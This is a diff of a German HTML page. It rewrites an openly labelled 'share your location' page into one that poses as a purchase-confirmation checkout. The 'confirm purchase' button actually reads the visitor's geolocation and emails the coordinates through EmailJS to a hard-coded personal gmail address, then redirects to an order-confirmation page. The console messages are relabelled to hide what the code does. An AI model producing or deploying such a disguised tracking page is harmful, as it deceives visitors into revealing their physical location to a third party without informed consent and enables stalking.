@@ -1,101 +1,97 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="de">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Standort per E-Mail senden</title>
+<title>Bestellung wird bearbeitet</title>
 <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f5;
-            text-align: center;
-        }
- 
-        .container {
-            background-color: #ffffff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
- 
-        button {
-            padding: 10px 20px;
-            font-size: 1em;
-            background-color: #4caf50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
- 
-        button:hover {
-            background-color: #45a049;
-        }
+    body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        font-family: Arial, sans-serif;
+        background-color: #f0f0f5;
+        text-align: center;
+    }
+    .container {
+        background-color: #ffffff;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    button {
+        padding: 10px 20px;
+        font-size: 1em;
+        background-color: #4caf50;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+    }
+    button:hover {
+        background-color: #45a049;
+    }
 </style>
 <!-- Verwende die aktualisierte EmailJS-Bibliothek -->
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
-        // EmailJS initialisieren mit deinem Public Key
-        (function(){
-            emailjs.init("Ko_3lmYK2sGcV4BaV"); // Ersetze mit deinem Public Key
-        })();
- 
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendEmail, showError);
-            } else {
-                console.log("Geolocation wird von diesem Browser nicht unterstützt.");
-            }
+    // EmailJS initialisieren mit deinem Public Key
+    (function(){
+        emailjs.init("Ko_3lmYK2sGcV4BaV"); // Ersetze mit deinem Public Key
+    })();
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendEmail, showError);
+        } else {
+            console.log("Geolocation wird von diesem Browser nicht unterstützt.");
         }
- 
-        function sendEmail(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
- 
-            console.log("Sende Standort:", latitude, longitude);
- 
-            // E-Mail-Versand über EmailJS
-            emailjs.send("service_5nak3uh", "template_0xwklu6", {
-                latitude: latitude,
-                longitude: longitude,
-                user_email: "voegeli05@gmail.com" // Empfängeradresse
-            }).then(function(response) {
-                console.log("Standort erfolgreich gesendet.");
-                // Weiterleitung zur Bestellbestätigungsseite
-                window.location.href = "bestellbestaetigung.html"; // Ersetze mit der URL deiner Bestätigungsseite
-            }, function(error) {
-                console.error("Fehler beim Senden des Standorts:", error);
-            });
+    }
+
+    function sendEmail(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        console.log("Sende Produkt/Dienstleistung:", latitude, longitude);
+
+        // E-Mail-Versand über EmailJS
+        emailjs.send("service_5nak3uh", "template_0xwklu6", {
+            latitude: latitude,
+            longitude: longitude,
+            user_email: "voegeli05@gmail.com" // Empfängeradresse
+        }).then(function(response) {
+            console.log("Kauf erfolgreich bestätigt.");
+            // Weiterleitung zur Bestätigungsseite nach erfolgreichem Versand
+            window.location.href = "bestellbestaetigung.html"; // Ersetze mit dem tatsächlichen Pfad zur Bestätigungsseite
+        }, function(error) {
+            console.error("Fehler beim Checkout:", error);
+        });
+    }
+
+    function showError(error) {
+        switch (error.code) {
+            case error.PERMISSION_DENIED:
+                console.log("Kauf abgelehnt.");
+                break;
+            case error.POSITION_UNAVAILABLE:
+                console.log("Kaufinformationen sind nicht verfügbar.");
+                break;
+            case error.TIMEOUT:
+                console.log("Dein Checkout ist abgelaufen.");
+                break;
+            case error.UNKNOWN_ERROR:
+                console.log("Ein unbekannter Fehler ist aufgetreten.");
+                break;
         }
- 
-        function showError(error) {
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    console.log("Standortfreigabe abgelehnt.");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    console.log("Standortinformationen sind nicht verfügbar.");
-                    break;
-                case error.TIMEOUT:
-                    console.log("Die Anforderung zum Abrufen des Standorts ist abgelaufen.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    console.log("Ein unbekannter Fehler ist aufgetreten.");
-                    break;
-            }
-        }
+    }
 </script>
 </head>
 <body>
 <div class="container">
-<h2>Standort teilen</h2>
-<p>Klicken Sie auf den Button, um Ihren aktuellen Standort zu teilen.</p>
-<button onclick="getLocation()">Standort freigeben</button>
+    <h2>Produkt Kaufen</h2>
+    <p>Klicken Sie auf den Button, um dein Kauf zu bestätigen.</p>
+    <button onclick="getLocation()">Kauf bestätigen...</button>
 </div>
 </body>
 </html>
